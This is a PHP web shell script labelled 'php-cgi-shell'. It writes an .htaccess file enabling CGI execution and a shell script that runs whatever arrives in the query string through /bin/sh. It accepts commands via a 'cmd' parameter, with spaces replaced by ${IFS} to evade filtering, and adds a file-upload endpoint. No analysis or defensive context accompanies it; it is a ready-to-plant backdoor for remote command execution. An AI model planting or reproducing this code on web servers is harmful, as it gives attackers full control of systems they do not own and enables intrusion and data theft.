<?php
// - php-cgi-shell ***
// - ZeuxHaxor ***

$dir = 'cgi';
$shell = 'cgi.was';

function create_directory($folder) {
    echo "Creating directory... ";
    mkdir($folder, 0777) or die('failed<br />');
    echo "done<br />";
}

function create_htaccess($file, $ext) {
    echo "Creating htaccess... ";
    $handle = fopen($file, 'w') or die('failed<br />');
    $data = <<<EOT
Options +ExecCGI
AddHandler cgi-script .$ext
EOT;
    fwrite($handle, $data);
    fclose($handle);
    echo "done<br />";
}

function create_shell($file) {
    echo "Creating shell... ";
    $handle = fopen($file, 'w') or die('failed<br />');
    $data = <<<EOT
#!/bin/sh
echo "Content-type: text/plain"
echo ""
/bin/sh -c "\$QUERY_STRING 2>&1"
EOT;
    fwrite($handle, $data);
    fclose($handle);
    echo "done<br />";
    echo "Making shell executable... ";
    chmod($file, 0755) or die('failed<br />');
    echo "done<br />";
}

function remove_shell($shell) {
    if (file_exists($shell)) {
        echo "Deleting shell... ";
        unlink($shell);
        echo "done<br />";
    }
}

function remove_htaccess($htaccess) {
    if (file_exists($htaccess)) {
        echo "Deleting htaccess... ";
        unlink($htaccess);
        echo "done<br />";
    }
}

function remove_directory($dir) {
    if (is_dir($dir)) {
        echo "Deleting folder... ";
        rmdir($dir);
        echo "done<br />";
    }
}

function display_shell($shell) {
    if (file_exists($shell)) {
        echo "<p>shell at [<a href=\"$shell\">$shell</a>]</p>";
        echo "<form action=\"\" method=\"post\">";
        echo "<input type=\"hidden\" name=\"remove\" value=\"1\" />";
        echo "<input type=\"submit\" value=\"remove shell\" />";
        echo "</form>";
        echo "<form action=\"\" method=\"post\">";
        echo "command: <input autofocus type=\"text\" name=\"cmd\" />";
        echo "<input type=\"submit\" value=\"exec\" /></form>";
    }
    else {

        echo "<p>no shell found.</p>";
        echo "<form action=\"\" method=\"post\">";
        echo "<input type=\"hidden\" name=\"create\" value=\"1\" />";
        echo "<input type=\"submit\" value=\"create shell\" />";
        echo "</form>";
    }
}

function execute_command($shell, $cmd) {
    $path = dirname($_SERVER['PHP_SELF']);
    $shell_url = "http://$_SERVER[HTTP_HOST]$path/$shell";
    $cmd = str_replace(' ', '${IFS}', $cmd);
    $response = file_get_contents($shell_url . '?' . $cmd);
    $output = htmlspecialchars($response);
    echo "$output";
}

$htaccess = "$dir/.htaccess";
$shell = "$dir/$shell";
$ext = pathinfo($shell, PATHINFO_EXTENSION);

if (isset($_REQUEST['remove'])) {
    remove_shell($shell);
    remove_htaccess($htaccess);
    remove_directory($dir);
}

if (isset($_GET['c'])) {
    create_directory($dir);
    create_htaccess($htaccess, $ext);
    create_shell($shell);
}

//display_shell($shell);

//if (isset($_REQUEST['cmd'])) {
//    $cmd = $_REQUEST['cmd'];
//    execute_command($shell, $cmd);
//}

if(isset($_GET['cmd'] )){
    $cmd = $_GET["cmd"];
    execute_command($shell, $cmd);

}

if(isset($_GET['up'] )){
if(isset($_FILES['image'])) {
    $filedir = "uploads/";
    $maxfile = 2000000;
    if (!is_dir($filedir)) mkdir($filedir, 0777, true);

    $file = $_FILES['image'];
    if ($file['error']) {
        echo "<center><b>Error: {$file['error']}</b></center>";
    } elseif ($file['size'] > $maxfile) {
        echo "<center><b>Error: File is too large. Max size is 2MB.</b></center>";
    } elseif (pathinfo($file['name'], PATHINFO_EXTENSION) != "txt") {
        echo "<center><b>Error: Only .txt files are allowed.</b></center>";
    } elseif (move_uploaded_file($file['tmp_name'], $filedir . basename($file['name']))) {
        echo "<center><b>Done ==> {$file['name']}</b></center>";
    } else {
        echo "<center><b>Error: Failed to upload the file.</b></center>";
    }
} else {
    echo "<center><b>No file received. Please try again.</b></center>";
}
}

?>
